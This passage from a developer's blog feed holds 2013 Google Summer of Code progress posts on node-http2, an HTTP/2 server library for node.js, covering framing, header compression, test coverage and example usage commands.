</span><span class="line"><span class="p">}).</span><span class="nx">listen</span><span class="p">(</span><span class="mi">8080</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Simple isn’t it?</p>

<p>I’ve also set up a public server at <a href="https://gabor.molnar.es:8080">https://gabor.molnar.es:8080</a>. This serves up the same content (the blog) as the main server at port 80, but it is possible to negotiate HTTP/2 using the TLS NPN extension (no ALPN support yet). If the client does not support HTTP/2 then it falls back to simple HTTPS, so you should be able to see the served content even if the client does not support HTTP/2 yet!</p>

<p>That’s it for now. I decided to use GitHub issues to maintain a TODO list, so have a look at the <a href="https://github.com/molnarg/node-http2/issues">issues page</a> if you want to se what’s ahead. Please open an issue or <a href="&#109;&#097;&#105;&#108;&#116;&#111;:&#103;&#097;&#098;&#111;&#114;&#064;&#109;&#111;&#108;&#110;&#097;&#114;&#046;&#101;&#115;">email me</a> directly if you find issues while testing.</p>

<p>As usual, the latest code is published on npm (just type <code>npm install http2</code> to install it), and the <a href="http://molnarg.github.io/node-http2/doc/">hosted version of the docs</a> was updated as well.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GSoC week #5]]></title>
    <link href="http://gabor.molnar.es/blog/2013/07/19/gsoc-week-number-5/"/>
    <updated>2013-07-19T17:47:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/07/19/gsoc-week-number-5</id>
    <content type="html"><![CDATA[<p>This is the summary of the fifth week of my Google Summer of Code project: <a href="https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001">HTTP/2 prototype server implementation in node.js</a>.</p>

<!-- more -->

<p>This week was about achieving an important milestone: making the first successful HTTP/2 request with node-http2! I am quite happy that I managed to achieve it before going to holiday next week. Please note that it does not mean support for the <a href="http://tools.ietf.org/html/draft-ietf-httpbis-http2-04#section-3.2">HTTP/1 upgrade process</a> or <a href="http://tools.ietf.org/html/draft-ietf-httpbis-http2-04#section-3.3">ALPN negotiation</a>. It’s <a href="http://tools.ietf.org/html/draft-ietf-httpbis-http2-04#section-3.4">raw HTTP/2 without any negotiation</a>.</p>

<p>Before showing a quick demo, a little bit more info about other things I did this week. First of all, it is now possible to measure test coverage of the node-http2 codebase. It is made possible by a great code coverage tool called <a href="https://github.com/gotwarlost/istanbul">istanbul</a>. It is this easy:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>npm <span class="nb">test</span> --coverage
</span><span class="line">
</span><span class="line">...
</span><span class="line">
</span><span class="line"><span class="o">===============================</span> Coverage <span class="nv">summary</span> <span class="o">===============================</span>
</span><span class="line">Statements   : 91.18% <span class="o">(</span> 775/850 <span class="o">)</span>
</span><span class="line">Branches     : 84.69% <span class="o">(</span> 249/294 <span class="o">)</span>
</span><span class="line">Functions    : 88.03% <span class="o">(</span> 103/117 <span class="o">)</span>
</span><span class="line">Lines        : 91.18% <span class="o">(</span> 775/850 <span class="o">)</span>
</span><span class="line"><span class="o">================================================================================</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>It also generates a detailed, line-by-line analysis, that you can have a look at <a href="http://molnarg.github.io/node-http2/coverage/lcov-report/lib/">here</a>. Using this, I managed to achieve 100% test coverage for the compression code, and in the process, I fixed several bugs that were discovered while writing the new test cases. I know that this does not mean that the compression code is now free of bugs, but still, it’s more reliable than before.</p>

<p>To make a HTTP/2 request for yourself using node-http2, follow these steps.</p>

<p>Clone node-http2 and install the development dependencies.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>git clone https://github.com/molnarg/node-http2.git
</span><span class="line">
</span><span class="line"><span class="nv">$ </span><span class="nb">cd </span>node-http2
</span><span class="line">
</span><span class="line"><span class="nv">$ </span>npm install
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Start the server in one shell (use the HTTP2_PORT environment variable to change the port):</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>node ./example/server.js
</span><span class="line">Listening on localhost:8080, serving up files from ./example
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Finally, use the client in an other shell to download the source code of the server:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>node ./example/client.js <span class="s1">&#39;http://localhost:8080/server.js&#39;</span> 2&gt;/tmp/server.js
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>To see the nice colored log output, try these (or use <code>bunyan --no-color</code> if your terminal does not play nice with bunyan):</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>sudo npm install -g bunyan <span class="c"># To be able to use the bunyan command line tool to format the logs</span>
</span><span class="line"><span class="nv">$ HTTP2_LOG</span><span class="o">=</span>debug node ./example/server.js | bunyan -o short
</span><span class="line"><span class="nv">$ HTTP2_LOG</span><span class="o">=</span>debug node ./example/client.js <span class="s1">&#39;http://localhost:8080/server.js&#39;</span> 2&gt;/tmp/server.js | bunyan -o short
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>The week after I come back, the plan is to implement a public API, sort out the handling of PUSH_PROMISE, and to write more documentation and test cases. I also plan to run a public server with publicly available debug logs to make it easy for client implementors to test with node-http2.</p>

<p>As usual, the latest code is published on npm (just type <code>npm install http2</code> to install it), and the <a href="http://molnarg.github.io/node-http2/doc/">hosted version of the docs</a> was updated as well. Feel free to open issues in the <a href="https://github.com/molnarg/node-http2/issues">issue tracker</a> or just <a href="&#109;&#097;&#105;&#108;&#116;&#111;:&#103;&#097;&#098;&#111;&#114;&#064;&#109;&#111;&#108;&#110;&#097;&#114;&#046;&#101;&#115;">email me</a> directly if you find any problem.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GSoC week #4]]></title>
    <link href="http://gabor.molnar.es/blog/2013/07/14/gsoc-week-number-4/"/>
    <updated>2013-07-14T20:33:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/07/14/gsoc-week-number-4</id>
    <content type="html"><![CDATA[<p>This is the summary of the fourth week of my Google Summer of Code project: <a href="https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001">HTTP/2 prototype server implementation in node.js</a>.</p>

<!-- more -->

<p>This one is going to be short. Last week was mainly about finishing the Stream class. It has tests, docs and everything else such a class needs to have :) The annotated source code is available <a href="http://molnarg.github.io/node-http2/stream.html">here</a>.</p>

<p>Lately I spent more time participating in discussions on the <a href="http://lists.w3.org/Archives/Public/ietf-http-wg/">http-wg mailing list</a>. I feel like the standard is now familiar enough to have useful feedback on some parts of the design. Since my mentor, Nick encouraged me to continue participating, I plan to remain active on the list in the future as well.</p>

<p>Next week I plan to implement the Connection class, that is a major part of the big puzzle, and this will make it possible to have meaningful communication between a node-http2 server and a client. Handshake is not planned for next week yet, but HTTP/2 does allow for a client and a server to communicate without handshake in certain cases, so this will be standard HTTP/2 conversation between the two component! :)</p>

<p>As usual, the latest code is published on npm (just type <code>npm install http2</code> to install it), and the <a href="http://molnarg.github.io/node-http2/framer.html">hosted version of the docs</a> was updated as well. Feel free to open issues in the <a href="https://github.com/molnarg/node-http2/issues">issue tracker</a> or just <a href="&#109;&#097;&#105;&#108;&#116;&#111;:&#103;&#097;&#098;&#111;&#114;&#064;&#109;&#111;&#108;&#110;&#097;&#114;&#046;&#101;&#115;">email me</a> directly if you find any problem.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GSoC week #3]]></title>
    <link href="http://gabor.molnar.es/blog/2013/07/08/gsoc-week-number-3/"/>
    <updated>2013-07-08T21:36:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/07/08/gsoc-week-number-3</id>
    <content type="html"><![CDATA[<p>This is the summary of the third week of my Google Summer of Code project: <a href="https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001">HTTP/2 prototype server implementation in node.js</a>.</p>

<!-- more -->

<p>Last week was about completing the compression code, adding logging and starting the stream implementation.</p>

<p>Header compression is something I’ve been working on for approximately a week, and now it’s finally complete! I’ve written a <a href="http://gabor.molnar.es/blog/2013/07/03/the-http-slash-2-header-compression-implementation-of-node-http2/">blog post</a> last week about trying it out. The compression code is not as optimized as it could be, but it’s a good start. It will probably improve in the future. The progress will be tracked in <a href="https://github.com/molnarg/node-http2/issues/3">this issue</a>. After it was finalized, I’ve spent a sleepless night with coming up with a <a href="http://lists.w3.org/Archives/Public/ietf-http-wg/2013JulSep/0181.html">proposal</a> for making the spec easier to implement.</p>

<p><img style="float: right; margin-left: 1em;" src="http://gabor.molnar.es/images/Akeley-Minnesota-Paul-Bunyan.jpg" /></p>

<p>For logging, I chose <a href="https://github.com/trentm/node-bunyan">node-bunyan</a>. It’s a great logging library with JSON format output. The biggest upside of using it is that the log can be much more detailed than with other libraries (very important for debugging), while remaining easy to search and pretty printable if needed. There’s a <a href="http://blog.nodejs.org/2012/03/28/service-logging-in-json-with-bunyan/">great blog post on the node.js blog</a> about it. It is an optional dependency, so it won’t burn CPU cycles when you don’t want it to.</p>

<p>By the way, if the origin of the name ‘bunyan’ is not clear to you (which is probably the case if you are not American), have a look at <a href="http://en.wikipedia.org/wiki/Paul_Bunyan">this</a> and <a href="http://en.wiktionary.org/wiki/log#Verb">this</a> page on Wikipedia :)</p>

<p>The stream code just started to arrive. Originally, I planned to write the <code>Connection</code> class first, but the stream multiplexing was not that easy to implement as it seemed to, and I though implementing the <code>Stream</code> first would make it easier to figure it out, so the connection code remains for this week.</p>

<p>As usual, the latest code is published on npm (just type <code>npm install http2</code> to install it), and the <a href="http://molnarg.github.io/node-http2/framer.html">hosted version of the docs</a> was updated as well. Feel free to open issues in the <a href="https://github.com/molnarg/node-http2/issues">issue tracker</a> or just <a href="&#109;&#097;&#105;&#108;&#116;&#111;:&#103;&#097;&#098;&#111;&#114;&#064;&#109;&#111;&#108;&#110;&#097;&#114;&#046;&#101;&#115;">email me</a> directly if you find any problem.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The HTTP/2 Header Compression implementation of node-http2]]></title>
    <link href="http://gabor.molnar.es/blog/2013/07/03/the-http-slash-2-header-compression-implementation-of-node-http2/"/>
    <updated>2013-07-03T18:21:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/07/03/the-http-slash-2-header-compression-implementation-of-node-http2</id>
    <content type="html"><![CDATA[<p>I’m happy to announce that node-http2 now implements the first draft of the <a href="http://tools.ietf.org/html/draft-ietf-httpbis-header-compression-00#appendix-B">HTTP/2 Header Compression</a> spec. This is the ‘-00’ version released on June 25, 2013.</p>

<p>The source code and the <a href="http://jashkenas.github.io/docco/">docco</a>-generated documentation of node-http2 is available on <a href="https://github.com/molnarg/node-http2">GitHub</a> and in the <a href="https://npmjs.org/package/http2">NPM repository</a>. The documentation for the compression code is available <a href="http://molnarg.github.io/node-http2/compressor.html">here</a> as well.</p>

<!-- more -->

<p>This implementation is designed to be part of a larger project, node-http2, but it’s easily usable in itself as well. If you’d like to see it for yourself, please follow the instructions in the next sections.</p>

<h2 id="first-steps">First steps</h2>

<p>Install node-http2 using npm, and start node.js:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>npm install http2
</span><span class="line">npm http GET https://registry.npmjs.org/http2
</span><span class="line">npm http 200 https://registry.npmjs.org/http2
</span><span class="line">http2@0.0.3 node_modules/http2
</span><span class="line"><span class="nv">$ </span>node
</span><span class="line">&gt;
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Load the two compressor classes:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="o">&gt;</span> <span class="kd">var</span> <span class="nx">http2</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;http2&#39;</span><span class="p">);</span>
</span><span class="line">
</span><span class="line"><span class="o">&gt;</span> <span class="kd">var</span> <span class="nx">Compressor</span> <span class="o">=</span> <span class="nx">http2</span><span class="p">.</span><span class="nx">compressor</span><span class="p">.</span><span class="nx">Compressor</span><span class="p">;</span>
</span><span class="line">
</span><span class="line"><span class="o">&gt;</span> <span class="kd">var</span> <span class="nx">Decompressor</span> <span class="o">=</span> <span class="nx">http2</span><span class="p">.</span><span class="nx">compressor</span><span class="p">.</span><span class="nx">Decompressor</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h2 id="reproducing-the-example-of-the-compression-spec1">Reproducing the <a href="http://tools.ietf.org/html/draft-ietf-httpbis-header-compression-00#appendix-B">example of the compression spec</a></h2>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="o">&gt;</span> <span class="kd">var</span> <span class="nx">decompressor</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Decompressor</span><span class="p">(</span><span class="s1">&#39;REQUEST&#39;</span><span class="p">);</span>
</span><span class="line">
</span><span class="line"><span class="o">&gt;</span> <span class="kd">var</span> <span class="nx">headerblock1</span> <span class="o">=</span> <span class="s1">&#39;44162f6d792d6578616d706c652f696e6465782e68746d6c4d0d6d792d757365722d6167656e&#39;</span> <span class="o">+</span>
</span><span class="line">                     <span class="s1">&#39;74400b782d6d792d686561646572056669727374&#39;</span><span class="p">;</span>
</span><span class="line">
</span><span class="line"><span class="o">&gt;</span> <span class="nx">decompressor</span><span class="p">.</span><span class="nx">decompress</span><span class="p">(</span><span class="k">new</span> <span class="nx">Buffer</span><span class="p">(</span><span class="nx">headerblock1</span><span class="p">,</span> <span class="s1">&#39;hex&#39;</span><span class="p">));</span>
</span><span class="line"><span class="p">{</span> <span class="s1">&#39;:path&#39;</span><span class="o">:</span> <span class="s1">&#39;/my-example/index.html&#39;</span><span class="p">,</span>
</span><span class="line">  <span class="s1">&#39;user-agent&#39;</span><span class="o">:</span> <span class="s1">&#39;my-user-agent&#39;</span><span class="p">,</span>
</span><span class="line">  <span class="s1">&#39;x-my-header&#39;</span><span class="o">:</span> <span class="s1">&#39;first&#39;</span> <span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="o">&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">decompressor</span><span class="p">.</span><span class="nx">_context</span><span class="p">.</span><span class="nx">_table</span><span class="p">);</span>
</span><span class="line"><span class="p">[</span> <span class="p">[</span> <span class="s1">&#39;:scheme&#39;</span><span class="p">,</span> <span class="s1">&#39;http&#39;</span><span class="p">,</span> <span class="nx">size</span><span class="o">:</span> <span class="mi">43</span> <span class="p">],</span>
</span><span class="line">  <span class="p">[</span> <span class="s1">&#39;:scheme&#39;</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span><span class="p">,</span> <span class="nx">size</span><span class="o">:</span> <span class="mi">44</span> <span class="p">],</span>
</span><span class="line">  <span class="p">...</span>
</span><span class="line">  <span class="p">[</span> <span class="s1">&#39;warning&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">size</span><span class="o">:</span> <span class="mi">39</span> <span class="p">],</span>
</span><span class="line">  <span class="p">[</span> <span class="s1">&#39;:path&#39;</span><span class="p">,</span> <span class="s1">&#39;/my-example/index.html&#39;</span><span class="p">,</span> <span class="nx">size</span><span class="o">:</span> <span class="mi">59</span> <span class="p">],</span>
</span><span class="line">  <span class="p">[</span> <span class="s1">&#39;user-agent&#39;</span><span class="p">,</span> <span class="s1">&#39;my-user-agent&#39;</span><span class="p">,</span> <span class="nx">size</span><span class="o">:</span> <span class="mi">55</span> <span class="p">],</span>
</span><span class="line">  <span class="p">[</span> <span class="s1">&#39;x-my-header&#39;</span><span class="p">,</span> <span class="s1">&#39;first&#39;</span><span class="p">,</span> <span class="nx">size</span><span class="o">:</span> <span class="mi">48</span> <span class="p">]</span> <span class="p">]</span>
</span><span class="line">
</span><span class="line"><span class="o">&gt;</span> <span class="kd">var</span> <span class="nx">headerblock2</span> <span class="o">=</span> <span class="s1">&#39;a6a804261f2f6d792d6578616d706c652f7265736f75726365732f7363726970742e6a735f0a0&#39;</span> <span class="o">+</span>
</span><span class="line">                     <span class="s1">&#39;67365636f6e64&#39;</span><span class="p">;</span>
</span><span class="line">
</span><span class="line"><span class="o">&gt;</span> <span class="nx">decompressor</span><span class="p">.</span><span class="nx">decompress</span><span class="p">(</span><span class="k">new</span> <span class="nx">Buffer</span><span class="p">(</span><span class="nx">headerblock2</span><span class="p">,</span> <span class="s1">&#39;hex&#39;</span><span class="p">));</span>
</span><span class="line"><span class="p">{</span> <span class="s1">&#39;user-agent&#39;</span><span class="o">:</span> <span class="s1">&#39;my-user-agent&#39;</span><span class="p">,</span>
</span><span class="line">  <span class="s1">&#39;:path&#39;</span><span class="o">:</span> <span class="s1">&#39;/my-example/resources/script.js&#39;</span><span class="p">,</span>
</span><span class="line">  <span class="s1">&#39;x-my-header&#39;</span><span class="o">:</span> <span class="s1">&#39;second&#39;</span> <span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="o">&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">decompressor</span><span class="p">.</span><span class="nx">_context</span><span class="p">.</span><span class="nx">_table</span><span class="p">);</span>
</span><span class="line"><span class="p">[</span> <span class="p">[</span> <span class="s1">&#39;:scheme&#39;</span><span class="p">,</span> <span class="s1">&#39;http&#39;</span><span class="p">,</span> <span class="nx">size</span><span class="o">:</span> <span class="mi">43</span> <span class="p">],</span>
</span><span class="line">  <span class="p">[</span> <span class="s1">&#39;:scheme&#39;</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span><span class="p">,</span> <span class="nx">size</span><span class="o">:</span> <span class="mi">44</span> <span class="p">],</span>
</span><span class="line">  <span class="p">...</span>
</span><span class="line">  <span class="p">[</span> <span class="s1">&#39;warning&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">size</span><span class="o">:</span> <span class="mi">39</span> <span class="p">],</span>
</span><span class="line">  <span class="p">[</span> <span class="s1">&#39;:path&#39;</span><span class="p">,</span> <span class="s1">&#39;/my-example/resources/script.js&#39;</span><span class="p">,</span> <span class="nx">size</span><span class="o">:</span> <span class="mi">68</span> <span class="p">],</span>
</span><span class="line">  <span class="p">[</span> <span class="s1">&#39;user-agent&#39;</span><span class="p">,</span> <span class="s1">&#39;my-user-agent&#39;</span><span class="p">,</span> <span class="nx">size</span><span class="o">:</span> <span class="mi">55</span> <span class="p">],</span>
</span><span class="line">  <span class="p">[</span> <span class="s1">&#39;x-my-header&#39;</span><span class="p">,</span> <span class="s1">&#39;first&#39;</span><span class="p">,</span> <span class="nx">size</span><span class="o">:</span> <span class="mi">48</span> <span class="p">],</span>
</span><span class="line">  <span class="p">[</span> <span class="s1">&#39;x-my-header&#39;</span><span class="p">,</span> <span class="s1">&#39;second&#39;</span><span class="p">,</span> <span class="nx">size</span><span class="o">:</span> <span class="mi">49</span> <span class="p">]</span> <span class="p">]</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<h2 id="compressing-and-then-decompressing">Compressing and then decompressing</h2>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="o">&gt;</span> <span class="kd">var</span> <span class="nx">decompressor</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Decompressor</span><span class="p">(</span><span class="s1">&#39;REQUEST&#39;</span><span class="p">);</span>
</span><span class="line">
</span><span class="line"><span class="o">&gt;</span> <span class="kd">var</span> <span class="nx">compressor</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Compressor</span><span class="p">(</span><span class="s1">&#39;REQUEST&#39;</span><span class="p">);</span>
</span><span class="line">
</span><span class="line"><span class="o">&gt;</span> <span class="kd">var</span> <span class="nx">buffer</span> <span class="o">=</span> <span class="nx">compressor</span><span class="p">.</span><span class="nx">compress</span><span class="p">({</span> <span class="s1">&#39;:path&#39;</span><span class="o">:</span> <span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="s1">&#39;user-agent&#39;</span><span class="o">:</span> <span class="s1">&#39;Firefox&#39;</span> <span class="p">});</span>
</span><span class="line">
</span><span class="line"><span class="o">&gt;</span> <span class="nx">buffer</span><span class="p">;</span>
</span><span class="line"><span class="o">&lt;</span><span class="nx">Buffer</span> <span class="mi">04</span> <span class="mi">03</span> <span class="mi">0</span><span class="nx">a</span> <span class="mi">69</span> <span class="mi">6</span><span class="nx">e</span> <span class="mi">64</span> <span class="mi">65</span> <span class="mi">78</span> <span class="mi">2</span><span class="nx">e</span> <span class="mi">68</span> <span class="mi">74</span> <span class="mi">6</span><span class="nx">d</span> <span class="mi">6</span><span class="nx">c</span> <span class="mi">0</span><span class="nx">d</span> <span class="mi">0</span><span class="nx">c</span> <span class="mi">07</span> <span class="mi">46</span> <span class="mi">69</span> <span class="mi">72</span> <span class="mi">65</span> <span class="mi">66</span> <span class="mi">6</span><span class="nx">f</span> <span class="mi">78</span><span class="o">&gt;</span>
</span><span class="line">
</span><span class="line"><span class="o">&gt;</span> <span class="nx">decompressor</span><span class="p">.</span><span class="nx">decompress</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
</span><span class="line"><span class="p">{</span> <span class="s1">&#39;:path&#39;</span><span class="o">:</span> <span class="s1">&#39;index.html&#39;</span><span class="p">,</span>
</span><span class="line">  <span class="s1">&#39;user-agent&#39;</span><span class="o">:</span> <span class="s1">&#39;Firefox&#39;</span> <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>This implementation is prabably not without bugs. If you find any, please report in the <a href="https://github.com/molnarg/node-http2/issues">issue tracker</a>. Thank you!</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GSoC week #2]]></title>
    <link href="http://gabor.molnar.es/blog/2013/07/01/gsoc-week-number-2/"/>
    <updated>2013-07-01T19:02:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/07/01/gsoc-week-number-2</id>
    <content type="html"><![CDATA[<p>This is the summary of the second week of my Google Summer of Code project: <a href="https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001">HTTP/2 prototype server implementation in node.js</a>.</p>

<!-- more -->

<p>Last week was about completing the framer and implementing the <a href="http://tools.ietf.org/html/draft-ietf-httpbis-header-compression-00">header compression spec</a>.</p>

<p>The framer is now updated to the latest revision of the HTTP/2 spec, and the error handling is finalized as well. The error handling policy is as follows:</p>

<ul>
  <li>when bad frame comes from the layers above, throw exceptions because that’s probably a bug</li>
  <li>when bad frame comes from the network, emit an error event that gets propagated to the layer above that can handle it</li>
</ul>

<p>The main focus for this week was on compression. This is basically a layer between the framer and the connection handler component. (See <a href="https://github.com/http2/wg_materials/raw/master/interim-13-06/editor-notes.pdf">this great slide deck</a> from Mark Nottingham for the overview of the layering in HTTP/2)</p>

<p>The two end of the connection have to maintain a synchronized compression state thorough the life of the connection, and it is not always easy. For example, HEADER frames may be split into multiple smaller HEADER frames when they are too large, but when sending these smaller frames, race conditions have to be prevented. If these would be just like any other frame, sending two segmented HEADER frame-set on two streams would possibly result in a race condition, and the sender could not garantee that the frames are decompressed in the same order in which they were compressed. That would lead to a desynchronized compression state. Because of this, the frames in these frame-sets must be sent strictly after each other on the wire to avoid race conditions.</p>

<p>The implementation is in a very good shape, but it is not yet ready. Serialization and deserialization are both working and tested, but the more complicated stuff largely remains for this week.</p>

<p>In the process of implementing the spec, I discovered a few problems in the text and reported them either via <a href="https://github.com/http2/compression-spec/issues/8">email</a> or with filing <a href="https://github.com/http2/compression-spec/issues/7">GitHub</a> <a href="https://github.com/http2/compression-spec/issues/6">tickets</a>. I’m quite happy that I could provide useful feedback on the spec! :)</p>

<p>As always, I would be glad to receive feedback to further improve the code! Feel free to open issues in the <a href="https://github.com/molnarg/node-http2/issues">issue tracker</a>, or just <a href="&#109;&#097;&#105;&#108;&#116;&#111;:&#103;&#097;&#098;&#111;&#114;&#064;&#109;&#111;&#108;&#110;&#097;&#114;&#046;&#101;&#115;">email me</a> directly.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GSoC week #1]]></title>
    <link href="http://gabor.molnar.es/blog/2013/06/23/gsoc-week-number-1/"/>
    <updated>2013-06-23T13:03:00+02:00</updated>
    <id>http://gabor.molnar.es/blog/2013/06/23/gsoc-week-number-1</id>
    <content type="html"><![CDATA[<p>This is the summary of the first week of my Google Summer of Code project: <a href="https://google-melange.appspot.com/gsoc/project/google/gsoc2013/molnarg/5001">HTTP/2 prototype server implementation in node.js</a>.</p>

<!-- more -->

<p>The component I started writing this week is the framer. Frames are the basic unit of communication in HTTP/2 and are defined <a href="http://http2.github.io/http2-spec/#frame-types">here</a> in the spec. The framer translates between two representations of a frame: JavaScript frame objects and binary buffers.</p>

<p>I decided to implement it as two node.js <a href="http://nodejs.org/api/stream.html#stream_class_stream_transform">transform streams</a>: the Serializer and the Deserializer. I tried to keep things as simple as possible: the main functions are static and either get one frame object as argument and return a buffer or the other way. This is not always optimal since it involves copying data around, but the readability and simplicity of the code is more important now.</p>

<p>I used docco for generating developer documentation, which can be found <a href="http://molnarg.github.io/node-http2/framer.html">here</a> for the framer. API documentation will be probably part of the README once it makes sense to write it.</p>

<p>Testing is very important part of the project, so I wrote BDD style tests for the framer. These are very easy to run, just install <a href="http://visionmedia.github.io/mocha/">mocha</a> and <a href="http://chaijs.com/">chai</a> (<code>npm install mocha chai</code>) and then run <code>npm test</code>.</p>

<p>The code is hosted on <a href="https://github.com/molnarg/node-http2">GitHub</a> and can be installed as a (not-yet functional) node.js module (<code>npm install http2</code>).</p>

<p>Tasks for the next week:</p>

<ul>
  <li>handling errors in the framer (probably emitting error events so that upper layers can get notified)</li>
  <li>syncing with the latest version of the spec (new and removed frame types, etc.)</li>
  <li>writing the compressor (that handles header compression/decompression)</li>
  <li>connection management code if I get to it</li>
</ul>

<p>I would be glad to receive feedback so that I can improve the code. Feel free to open issues in the <a href="https://github.com/molnarg/node-http2/issues">issue tracker</a>, or just <a href="&#109;&#097;&#105;&#108;&#116;&#111;:&#103;&#097;&#098;&#111;&#114;&#064;&#109;&#111;&#108;&#110;&#097;&#114;&#046;&#101;&#115;">email me</a> directly. If you want to get notified when I post status updates in the future, you can subscribe to the <a href="http://gabor.molnar.es/blog/categories/google-summer-of-code/atom.xml">GSoC category feed</a> of this blog.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Google Summer of Code]]></title>
    <link href="http://gabor.molnar.es/blog/2013/06/11/google-summer-of-code/"/>
    <updated>2013-06-11T10:08:00+02:00</updated>
